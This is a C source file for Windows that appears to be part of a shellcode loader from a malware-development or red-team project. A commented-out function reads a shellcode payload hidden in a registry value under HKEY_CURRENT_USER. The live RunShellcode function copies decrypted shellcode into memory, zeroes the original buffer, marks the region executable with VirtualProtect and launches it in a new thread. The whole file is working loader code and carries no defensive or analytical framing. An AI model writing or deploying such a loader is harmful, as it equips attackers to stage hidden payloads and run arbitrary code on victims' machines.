#include <windows.h>
#include <stdio.h>
#include "write_payload.h"

#define REGISTRY "SOFTWARE\\YourRegistryKey"
#define REGSTRING "YourPayloadValue"

//// Function to read shellcode from the Windows Registry
//BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {
//    LSTATUS STATUS;
//    DWORD dwBytesRead = 0;
//    PVOID pBytes = NULL;
//
//    // Allocate memory for the shellcode
//    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
//    if (pBytes == NULL) {
//        printf("[ERROR] HeapAlloc Failed With Error: %d\n", GetLastError());
//        return FALSE;
//    }
//
//    // Verbose output for heap allocation success
//    printf("[DEBUG] Allocated %d bytes for shellcode.\n", sPayloadSize);
//
//    // Read the payload (shellcode) from the registry
//    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
//    if (ERROR_SUCCESS != STATUS) {
//        printf("[ERROR] RegGetValueA Failed With Error: %d\n", STATUS);
//        HeapFree(GetProcessHeap(), 0, pBytes);
//        return FALSE;
//    }
//
//    // Ensure the read payload size matches the expected size
//    if (sPayloadSize != dwBytesRead) {
//        printf("[ERROR] Bytes Read: %d; Expected: %d\n", dwBytesRead, sPayloadSize);
//        HeapFree(GetProcessHeap(), 0, pBytes);
//        return FALSE;
//    }
//
//    printf("[DEBUG] Read %d bytes from the registry.\n", dwBytesRead);
//    *ppPayload = (PBYTE)pBytes;
//    return TRUE;
//}

// Function to execute the shellcode
BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {
    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection = 0;

    // Allocate memory for the shellcode
    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[ERROR] VirtualAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[DEBUG] Allocated memory at: 0x%p\n", pShellcodeAddress);

    // Copy the shellcode to the allocated memory
    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);  // Zero-out original decrypted shellcode

    // Change the memory protection to allow execution
    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[ERROR] VirtualProtect Failed With Error: %d\n", GetLastError());
        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[DEBUG] Changed memory protection to executable.\n");

    // Create a thread to execute the shellcode
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL) == NULL) {
        printf("[ERROR] CreateThread Failed With Error: %d\n", GetLastError());
        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[DEBUG] Shellcode execution thread created.\n");
    return TRUE;
}
